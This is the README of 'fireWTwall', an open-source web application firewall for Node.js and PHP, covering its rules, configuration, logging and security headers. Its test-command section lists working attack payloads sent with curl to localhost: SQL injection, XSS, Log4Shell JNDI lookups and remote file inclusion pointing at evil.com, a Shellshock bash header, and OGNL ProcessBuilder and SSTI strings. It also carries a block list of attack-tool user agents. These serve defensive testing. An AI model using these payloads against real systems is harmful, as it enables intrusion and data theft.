# 🔥 fireWTwall

[![npm](https://img.shields.io/npm/v/firewtwall)](https://www.npmjs.com/package/firewtwall)
[![version](https://img.shields.io/badge/version-2.1.0-orange)](https://github.com/saarors/fireWTwall/releases)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Node.js](https://img.shields.io/badge/node-%3E%3D16-brightgreen)](https://nodejs.org)
[![PHP](https://img.shields.io/badge/php-%3E%3D8.0-777BB4)](https://www.php.net)
[![TypeScript](https://img.shields.io/badge/types-included-blue)](nodejs/index.d.ts)
[![Author](https://img.shields.io/badge/author-saarors-blue)](https://github.com/saarors)

> **Designed, built and maintained by [saarors](https://github.com/saarors)**

A production-ready **Web Application Firewall (WAF)** with **zero external runtime dependencies**.
Available as an **npm package** for Node.js / Express and as a drop-in **PHP auto-prepend file**.

```bash
npm install firewtwall
```

| Version | Integration | Get it |
|---------|-------------|--------|
| **Node.js** | Express middleware chain | `npm install firewtwall` |
| **PHP** | `auto_prepend_file` / `.htaccess` | Clone / download `php/` |

Both versions share the same rule sets, detection philosophy, and NDJSON log format.

---

## Table of contents

1. [Protections](#protections)
2. [Node.js](#nodejs--npm-package)
   - [Quick start](#quick-start)
   - [All options](#all-options)
   - [Debug mode](#debug-mode)
   - [Log viewer CLI](#log-viewer-cli)
   - [Redis / multi-process](#redis--multi-process)
   - [Configuration reference](#configuration-reference)
   - [TypeScript](#typescript)
   - [Test commands](#test-commands)
3. [PHP](#php)
   - [Requirements & install](#requirements)
   - [Configuration](#configuration-phpconfigwafconfigphp)
   - [Rate limiter storage](#rate-limiter-storage)
   - [Debug mode (PHP)](#debug-mode-php)
4. [Middleware pipeline](#middleware-pipeline)
5. [Log format](#log-format)
6. [Security headers](#security-headers-added-to-every-response)
7. [Project structure](#project-structure)
8. [Important notes](#important-notes)
9. [License & credits](#license)

---


## What's new in v2.1.0 — Metasploit-class protections

| | Area | CVEs / Metasploit modules covered |
|--|------|----------------------------------|
| 🛡️ | **SSTI** (18 rules) | Jinja2, Twig, FreeMarker, Velocity, Smarty, ERB, OGNL/Struts2, Spring4Shell (CVE-2022-22965), Tornado |
| 🛡️ | **RFI** — Remote File Inclusion (6 rules) | HTTP/FTP/SMB/expect:// inclusion, log poisoning, `/proc/self/environ` |
| 🛡️ | **Log4Shell** (6 rules) | CVE-2021-44228 — JNDI LDAP/RMI/DNS, all obfuscation variants (`${lower:}`, `${::-j}`, nested) |
| 🛡️ | **Shellshock** (2 rules) | CVE-2014-6271 / CVE-2014-7169 — `() { :; };` in any header |
| 🛡️ | **NoSQL injection** (11 rules) | MongoDB `$ne`, `$gt`, `$lt`, `$where`, `$regex`, `$expr`, bracket-notation (`[$ne]=1`) |
| 🛡️ | **LDAP injection** (6 rules) | Filter bypass, parenthesis injection, null-byte, uid/admin wildcard, hex-encoded chars |
| 🛡️ | **Deserialization** (7 rules) | PHP `O:N:` objects, Java `AC ED 00 05` (base64 + hex), Python pickle, node-serialize RCE |
| 🤖 | **97 blocked bots** | Added: msf/, msfpayload, tplmap, ysoserial, jexboss, commix, dotdotpwn, xsser, beef-, and 20+ more |

---

## Protections

| Layer | What it catches | Rules |
|-------|----------------|:-----:|
| **SQL Injection** | UNION SELECT, stacked queries, blind (SLEEP/WAITFOR), EXTRACTVALUE, UPDATEXML, GTID_SUBSET, EXP(~()), sys schema, CASE WHEN, `@@version` | **38** |
| **XSS** | Script tags, `on*=` handlers, DOM sinks, AngularJS `{{}}`, data URIs, SVG animate, CSS `@import`, `-moz-binding`, meta refresh | **29** |
| **Path Traversal** | `../` sequences, null bytes, PHP wrappers, Windows paths (`C:\`, system32), `/boot/grub`, `.env`, `.git/`, `.ssh/` | **18** |
| **Command Injection** | Shell pipes, PowerShell, wget/curl RCE, Python/Ruby/Perl/PHP/Node CLI, netcat, whoami, env dump | **18** |
| **SSTI** | Jinja2, Twig, FreeMarker, Velocity, Smarty, ERB, OGNL/Struts2, Spring4Shell, Tornado | **18** |
| **RFI** | HTTP/FTP/SMB/expect:// inclusion, log poisoning, `/proc/self/environ` — file-param names only | **6** |
| **Log4Shell** | CVE-2021-44228 — JNDI LDAP/RMI/DNS + all obfuscation variants | **6** |
| **Shellshock** | CVE-2014-6271 — `() { :; };` scanned in every header | **2** |
| **NoSQL Injection** | MongoDB `$ne`, `$gt`, `$where`, `$regex`, `$expr` — params + bracket notation | **11** |
| **LDAP Injection** | Filter bypass, parenthesis injection, null-byte, uid/admin wildcard, hex chars | **6** |
| **Deserialization** | PHP `O:N:`, Java `AC ED 00 05` (base64 + hex), Python pickle, node-serialize RCE | **7** |
| **SSRF** | Private IPs, cloud metadata (169.254.169.254, Azure, GCP), dangerous URI schemes | **3** |
| **XXE** | DOCTYPE, ENTITY SYSTEM/PUBLIC, parameter entities, XInclude — XML bodies only | **5** |
| **Open Redirect** | Absolute URLs or `//` in redirect/return/next/dest params | **1** |
| **Prototype Pollution** | `__proto__`, `constructor.prototype` in query/body/JSON keys | **1** |
| **CRLF / Header Injection** | HTTP response splitting, host-header injection | — |
| **Rate Limiting** | Sliding-window per IP — configurable window, limit, block duration. Redis-ready | — |
| **IP Filter** | Blacklist + whitelist with CIDR — IPv4 and IPv6 | — |
| **Bad Bot Blocking** | **97** blocked signatures: sqlmap, nmap, ffuf, nuclei, Metasploit (msf/), tplmap, ysoserial, Shodan… | — |
| **HTTP Method Filter** | Rejects TRACE, CONNECT, and any non-configured verb | — |
| **Request Size Limit** | `Content-Length` header check + streaming byte guard | — |
| **Security Headers** | HSTS, CSP, COOP, CORP, COEP, Referrer-Policy, Permissions-Policy, NEL — `X-Powered-By` stripped | — |

**Dual mode:** `mode: 'reject'` blocks · `mode: 'log-only'` audits without blocking *(recommended for first deploy)*

---

## Node.js — npm package

### Quick start

```bash
npm install firewtwall
```

```js
const express = require('express');
const { createWAF } = require('firewtwall');

const app = express();

// Parse body BEFORE the WAF so it can inspect request data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Mount the WAF — spread the returned middleware array
app.use(...createWAF());

app.get('/', (req, res) => res.json({ ok: true }));
app.listen(3000);
```

---

### All options

```js
const { createWAF, setStore } = require('firewtwall');

app.use(...createWAF({
  mode: 'reject',              // 'reject' | 'log-only'
  rateLimit: {
    windowMs:        60_000,   // 1-minute sliding window
    maxRequests:     100,      // max requests per window per IP
    blockDurationMs: 600_000,  // 10-minute block after violation
  },
  whitelist:      ['127.0.0.1', '10.0.0.0/8'],  // bypass all checks
  blacklist:      ['203.0.113.0/24'],            // always block
  bypassPaths:    ['/health', '/metrics'],       // skip WAF entirely
  trustedProxies: ['172.16.0.1'],               // honour X-Forwarded-For
  logPath:        './logs/waf.log',             // NDJSON log
  responseType:   'json',                       // 'json' | 'html'
  debug:          false,                        // see Debug mode below
}));
```

---

### Debug mode

```js
app.use(...createWAF({ debug: true }));
```

When `debug: true` every request — pass **and** block — is fully traced:

| What changes | Detail |
|---|---|
| **All requests logged** | Every request lands in the NDJSON log with processing time and checks run |
| **X-WAF-\* response headers** | Four headers expose the outcome to the caller |
| **Verbose log fields** | Raw matched value, decoded value, and exact rule name are included |

**Response headers in debug mode:**

| Header | Example value | Present |
|--------|--------------|---------|
| `X-WAF-RequestId` | `f47ac10b58cc1122` | Always |
| `X-WAF-Result` | `passed` or `blocked` | Always |
| `X-WAF-Rule` | `sql-union-select` | Blocked only |
| `X-WAF-Time` | `0.83ms` | Always |

**Passed request — log entry:**
```json
{
  "timestamp": "2026-03-30T10:00:00Z",
  "requestId": "f47ac10b58cc1122",
  "ip": "127.0.0.1",
  "method": "GET",
  "path": "/",
  "result": "passed",
  "processingTimeMs": 0.42,
  "checksRun": 16
}
```

**Blocked request — log entry:**
```json
{
  "timestamp": "2026-03-30T10:00:01Z",
  "requestId": "a1b2c3d4e5f6a7b8",
  "ip": "203.0.113.42",
  "method": "GET",
  "path": "/search",
  "result": "blocked",
  "rule": "sql-union-select",
  "matched": "UNION SELECT",
  "decoded": "UNION SELECT",
  "source": "query",
  "severity": "critical",
  "processingTimeMs": 0.83,
  "userAgent": "sqlmap/1.7"
}
```

**Catch nmap in debug mode:**
```bash
# Fire nmap at your dev server
nmap -sV localhost -p 3000

# See the blocked probe in the log
npx waf-log --blocked --rule nmap
```

> ⚠️ **Never use `debug: true` in production** — it leaks internal rule names to the caller.

---

### Log viewer CLI

```bash
# Last 50 entries (default)
npx waf-log

# Last 100 entries from a custom log file
npx waf-log --tail 100 ./logs/waf.log

# Stats — top rules, top IPs, severity breakdown
npx waf-log --stats

# Only blocked requests
npx waf-log --blocked

# Filter by IP or rule (partial match)
npx waf-log --ip 203.0.113.42
npx waf-log --rule sql

# Entries after a timestamp
npx waf-log --since 2026-03-30T00:00:00Z

# Raw NDJSON — pipe-friendly
npx waf-log --json | jq .
```

---

### Redis / multi-process

Replace the built-in in-memory store with any key-value backend:

```js
const { createWAF, setStore } = require('firewtwall');
const redis = require('ioredis');

const client = new redis();

setStore({
  get: async (key)        => JSON.parse(await client.get(key) ?? 'null'),
  set: async (key, value) => client.set(key, JSON.stringify(value)),
  del: async (key)        => client.del(key),
});

app.use(...createWAF());
```

---

### Configuration reference

| Key | Default | Description |
|-----|---------|-------------|
| `mode` | `'reject'` | `'reject'` blocks · `'log-only'` audits |
| `allowedMethods` | `['GET','POST','PUT','PATCH','DELETE','OPTIONS','HEAD']` | Permitted HTTP verbs |
| `maxBodySize` | `10485760` | Max `Content-Length` in bytes (10 MB) |
| `rateLimit.windowMs` | `60000` | Sliding-window duration in ms |
| `rateLimit.maxRequests` | `100` | Requests allowed per window per IP |
| `rateLimit.blockDurationMs` | `600000` | Block duration after violation |
| `whitelist` | `[]` | IPs / CIDRs that bypass all checks |
| `blacklist` | `[]` | IPs / CIDRs that are always blocked |
| `bypassPaths` | `['/health','/ping']` | Paths that skip all WAF checks |
| `trustedProxies` | `[]` | Enable `X-Forwarded-For` parsing |
| `logPath` | `'./logs/waf.log'` | NDJSON log file path |
| `responseType` | `'json'` | Block response: `'json'` or `'html'` |
| `debug` | `false` | Full request tracing + `X-WAF-*` headers |

---

### TypeScript

Types ship with the package — no `@types/` install needed:

```ts
import { createWAF, setStore, WAFOptions, StoreAdapter } from 'firewtwall';

const opts: WAFOptions = {
  mode: 'reject',
  debug: false,
  blacklist: ['203.0.113.0/24'],
};

app.use(...createWAF(opts));
```

---

### Test commands

```bash
# SQL injection → 403
curl "http://localhost:3000/?q=1+UNION+SELECT+*+FROM+users"

# XSS → 403
curl "http://localhost:3000/?q=<script>alert(1)</script>"

# Path traversal → 403
curl "http://localhost:3000/?file=../../etc/passwd"

# Command injection → 403
curl "http://localhost:3000/?cmd=|cat+/etc/passwd"

# CRLF injection → 400
curl -H $'X-Header: foo\r\nInjected: bar' http://localhost:3000/

# SSRF — cloud metadata → 403
curl "http://localhost:3000/?url=http://169.254.169.254/latest/meta-data"

# SSRF — private IP → 403
curl "http://localhost:3000/?redirect=http://192.168.1.1/admin"

# XXE — external entity → 403
curl -X POST http://localhost:3000/upload \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>'

# Open redirect → 403
curl "http://localhost:3000/login?returnUrl=//evil.com"

# Prototype pollution → 403
curl "http://localhost:3000/?__proto__[admin]=true"

# Log4Shell (CVE-2021-44228) — scanned in every header → 403
curl -H 'User-Agent: ${jndi:ldap://evil.com/a}' http://localhost:3000/

# Log4Shell obfuscated variant → 403
curl -H 'X-Api-Version: ${${lower:j}ndi:ldap://evil.com/a}' http://localhost:3000/

# Shellshock (CVE-2014-6271) — any header → 403
curl -H 'User-Agent: () { :; }; /bin/bash -c "id"' http://localhost:3000/

# SSTI — Jinja2/Python → 403
curl "http://localhost:3000/?name={{__class__.__mro__}}"

# SSTI — Twig → 403
curl "http://localhost:3000/?tpl={{_self.env.registerUndefinedFilterCallback('exec')}}"

# SSTI — Struts2/OGNL → 403
curl "http://localhost:3000/?redirect=%{#a=new+java.lang.ProcessBuilder({'id'}).start()}"

# Remote file inclusion → 403
curl "http://localhost:3000/?file=http://evil.com/shell.php"

# NoSQL injection — MongoDB $ne → 403
curl "http://localhost:3000/login?user[$ne]=x&pass[$ne]=x"

# NoSQL injection — JSON body → 403
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"user": {"$ne": null}, "pass": {"$ne": null}}'

# LDAP injection → 403
curl "http://localhost:3000/search?user=*)(uid=*))(|(uid=*"

# PHP deserialization → 403
curl "http://localhost:3000/?data=O:8:\"stdClass\":0:{}"

# Java deserialization (base64 magic) → 403
curl "http://localhost:3000/?payload=rO0ABXNy"

# Bad bot (Metasploit) → 403
curl -A "msf/1.0" http://localhost:3000/

# Bad bot (tplmap) → 403
curl -A "tplmap/0.5" http://localhost:3000/

# Clean request → 200
curl http://localhost:3000/
```

---

## PHP

### Requirements

- PHP ≥ 8.0
- APCu extension *(optional but recommended — file-based fallback included)*

### Installation

**Option A — `php.ini`** (server-wide):
```ini
auto_prepend_file = /absolute/path/to/fireWTwall/php/waf.php
```

**Option B — `.htaccess`** (per-directory, Apache):
```apache
php_value auto_prepend_file "/absolute/path/to/fireWTwall/php/waf.php"
```

**Option C — manual include** (any framework):
```php
<?php
require_once '/path/to/fireWTwall/php/waf.php';
// Your application starts here
```

---

### Configuration (`php/config/waf.config.php`)

```php
<?php
return [
    'allowed_methods'   => ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD'],
    'max_body_size'     => 10 * 1024 * 1024,   // 10 MB
    'rate_limit'        => [
        'window_sec'         => 60,
        'max_requests'       => 100,
        'block_duration_sec' => 600,
    ],
    'whitelist'         => [],                  // IPs / CIDRs that bypass all checks
    'blacklist'         => [],                  // IPs / CIDRs always blocked
    'bypass_paths'      => ['/health', '/ping'],
    'trusted_proxies'   => [],
    'mode'              => 'reject',            // 'reject' | 'log-only'
    'log_path'          => __DIR__ . '/../logs/waf.log',
    'response_type'     => 'json',              // 'json' | 'html'
    'debug'             => false,
];
```

---

### Rate limiter storage

| Backend | When used | Notes |
|---------|-----------|-------|
| **APCu** | APCu extension loaded | Fast, atomic, shared across PHP-FPM workers |
| **File-based** | Fallback | Uses `sys_get_temp_dir()` — safe for shared hosting |

Enable APCu in `php.ini`:
```ini
extension=apcu
apc.enabled=1
```

---

### Debug mode (PHP)

Set `'debug' => true` in `waf.config.php`. The same `X-WAF-*` response headers and verbose NDJSON log entries as the Node.js version will be produced.

> ⚠️ **Disable in production.** Debug mode exposes rule names to the client.

---

## Middleware pipeline

Requests pass through **23 stages** (Node.js) / **22 stages** (PHP) in this order:

```
Request
  │
  ├─  1  Security headers          → added to every response regardless of outcome
  ├─  2  Request size              → 413 if Content-Length exceeds limit
  ├─  3  HTTP method               → 405 if verb not in allowedMethods
  ├─  4  IP filter                 → whitelist bypasses everything; blacklist → 403
  ├─  5  Rate limiting             → 429 + Retry-After if window exceeded
  ├─  6  Bot detection             → 403 if User-Agent matches 97 blocked signatures
  ├─  7  Prototype pollution       → 403 (__proto__, constructor.prototype in keys)
  ├─  8  SSRF                      → 403 (private IPs, cloud metadata, URI schemes)
  ├─  9  XXE                       → 403 (XML bodies with DOCTYPE / ENTITY / XInclude)
  ├─ 10  Open redirect             → 403 (absolute URL in redirect-style params)
  ├─ 11  Header injection (CRLF)   → 400
  ├─ 12  Path traversal            → 403 (18 rules)
  ├─ 13  Command injection         → 403 (18 rules)
  ├─ 14  SQL injection             → 403 (38 rules)
  ├─ 15  XSS                       → 403 (29 rules)
  ├─ 16  SSTI                      → 403 (18 rules — Jinja2, Twig, OGNL, Spring, ERB…)
  ├─ 17  RFI                       → 403 (6 rules — HTTP/FTP/SMB/expect/log-poison)
  ├─ 18  Log4Shell                 → 403 (6 rules — CVE-2021-44228 + all obfuscations)
  ├─ 19  Shellshock                → 403 (2 rules — CVE-2014-6271, scans ALL headers)
  ├─ 20  NoSQL injection           → 403 (11 rules — MongoDB operators + bracket syntax)
  ├─ 21  LDAP injection            → 403 (6 rules — filter bypass, null-byte, wildcard)
  └─ 22  Deserialization           → 403 (7 rules — PHP, Java, Python, node-serialize)
         │
         ▼
     Application
```

Pattern-based stages (12–22) scan: `query params` · `request body` · `URL path` · `cookies` · `all headers`

> Log4Shell (stage 18) and Shellshock (stage 19) scan **every HTTP header** — not just params.

---

## Log format

Every blocked request appends one NDJSON line to the log file:

```json
{
  "timestamp": "2026-03-30T15:30:00Z",
  "requestId": "f47ac10b58cc1122",
  "ip": "203.0.113.42",
  "method": "GET",
  "path": "/search",
  "rule": "sql-union-select",
  "matched": "UNION SELECT",
  "source": "query",
  "severity": "critical",
  "userAgent": "sqlmap/1.7"
}
```

**Severity levels:** `critical` · `high` · `medium`

**Sources:** `query` · `body` · `path` · `cookie:<name>` · `user-agent` · `header:<name>`

---

## Security headers (added to every response)

| Header | Value |
|--------|-------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` |
| `Content-Security-Policy` | `default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'` |
| `X-Content-Type-Options` | `nosniff` |
| `X-Frame-Options` | `SAMEORIGIN` |
| `X-XSS-Protection` | `1; mode=block` |
| `Referrer-Policy` | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | `geolocation=(), microphone=(), camera=(), payment=(), usb=(), interest-cohort=()` |
| `Cross-Origin-Opener-Policy` | `same-origin` |
| `Cross-Origin-Resource-Policy` | `same-origin` |
| `Cross-Origin-Embedder-Policy` | `require-corp` |
| `X-Permitted-Cross-Domain-Policies` | `none` |
| `NEL` | `{"report_to":"default","max_age":31536000,"include_subdomains":true}` |
| `X-Powered-By` | *(removed)* |

---

## Project structure

```
fireWTwall/
├── nodejs/                          ← npm package "firewtwall"
│   ├── waf.js                       ← Entry: createWAF(), setStore()
│   ├── index.d.ts                   ← TypeScript definitions
│   ├── package.json
│   ├── config/
│   │   ├── waf.config.js
│   │   └── bad-bots.json            ← 97 blocked signatures
│   ├── middleware/                  ← 22 independent middleware modules
│   │   ├── securityHeaders.js       ← HSTS, CSP, NEL, removes X-Powered-By
│   │   ├── requestSize.js
│   │   ├── methodFilter.js
│   │   ├── ipFilter.js
│   │   ├── rateLimit.js             ← Pluggable store interface
│   │   ├── botFilter.js
│   │   ├── prototypePollution.js    ← __proto__, constructor.prototype
│   │   ├── ssrf.js                  ← Private IPs, cloud metadata, URI schemes
│   │   ├── xxe.js                   ← DOCTYPE, ENTITY, XInclude (XML bodies)
│   │   ├── openRedirect.js          ← Absolute URLs in redirect params
│   │   ├── headerInjection.js
│   │   ├── pathTraversal.js         ← 18 rules
│   │   ├── commandInjection.js      ← 18 rules
│   │   ├── sqlInjection.js          ← 38 rules
│   │   ├── xss.js                   ← 29 rules
│   │   ├── ssti.js                  ← 18 rules (Jinja2, Twig, OGNL, Spring, ERB…)
│   │   ├── rfi.js                   ← 6 rules (HTTP/FTP/SMB/expect/log-poison)
│   │   ├── log4shell.js             ← 6 rules (CVE-2021-44228, all headers)
│   │   ├── shellshock.js            ← 2 rules (CVE-2014-6271, all headers)
│   │   ├── nosqlInjection.js        ← 11 rules (MongoDB operators + bracket notation)
│   │   ├── ldapInjection.js         ← 6 rules (filter bypass, null-byte, wildcard)
│   │   └── deserialization.js       ← 7 rules (PHP, Java, Python, node-serialize)
│   ├── utils/
│   │   ├── patternMatcher.js        ← Multi-pass decode + cookie scanning
│   │   ├── ipUtils.js               ← IPv4 + IPv6 CIDR matching
│   │   └── logger.js                ← Buffered NDJSON logger
│   └── bin/
│       └── waf-log.js               ← CLI log viewer
│
└── php/                             ← Drop-in PHP WAF
    ├── waf.php                      ← Entry point (auto_prepend_file target)
    ├── composer.json
    ├── config/
    │   ├── waf.config.php
    │   └── bad-bots.php             ← 97 blocked signatures
    └── src/
        ├── WAF.php                  ← 22-step pipeline
        ├── Request.php              ← Double-encoding + Unicode decode + cookies
        ├── IpFilter.php
        ├── RateLimiter.php          ← APCu or file-based fallback
        ├── Logger.php               ← NDJSON with flock
        ├── Response.php             ← HSTS, CSP, removes X-Powered-By
        └── detectors/
            ├── SqlInjectionDetector.php       ← 38 rules
            ├── XssDetector.php                ← 29 rules
            ├── PathTraversalDetector.php      ← 18 rules
            ├── CommandInjectionDetector.php   ← 18 rules
            ├── HeaderInjectionDetector.php
            ├── BotDetector.php
            ├── SsrfDetector.php
            ├── XxeDetector.php
            ├── OpenRedirectDetector.php
            ├── MassAssignmentDetector.php
            ├── SstiDetector.php               ← 18 rules
            ├── RfiDetector.php                ← 6 rules
            ├── Log4ShellDetector.php          ← 6 rules (CVE-2021-44228)
            ├── ShellshockDetector.php         ← 2 rules (CVE-2014-6271)
            ├── NoSqlInjectionDetector.php     ← 11 rules
            ├── LdapInjectionDetector.php      ← 6 rules
            └── DeserializationDetector.php    ← 7 rules
```

---

## Important notes

- **Start with `log-only` mode** in production. Review logs for false positives before switching to `reject`.
- The **`logs/` directory** must be writable by the web server but **not** web-accessible. The included `php/logs/.htaccess` handles this for Apache.
- This WAF is a **defence-in-depth layer** — it does not replace parameterised queries, input validation, or proper output encoding in your application code.
- For multi-process / multi-server Node.js deployments, swap the in-memory rate-limit store with Redis (see the [Redis example](#redis--multi-process) above).
- The CSP header shipped by default is strict. If your app loads scripts or styles from external origins, tune `Content-Security-Policy` in the security-headers middleware before deploying.

---

## License

MIT © [saarors](https://github.com/saarors)

---

## Credits

### Author & lead developer

| | |
|---|---|
| **[saarors](https://github.com/saarors)** | Created fireWTwall from scratch — designed the full architecture, wrote every detection rule for both the Node.js and PHP editions, built and published the npm package, and owns every release. |

### Contributors

| Contributor | Role | Commits | Lines+ | Lines− |
|-------------|------|--------:|-------:|-------:|
| **[saarors](https://github.com/saarors)** | Author & lead developer | **#1** | **+3,696** | **-403** |
| claude | AI pair-programmer | #2 | +3,473 | -201 |

> **saarors** is the #1 contributor by every metric.
> All design decisions, architecture choices, and release ownership belong to **saarors**.

[![GitHub](https://img.shields.io/badge/github-saarors%2FfireWTwall-181717?logo=github)](https://github.com/saarors/fireWTwall)
[![npm](https://img.shields.io/badge/npm-firewtwall-CB3837?logo=npm)](https://www.npmjs.com/package/firewtwall)
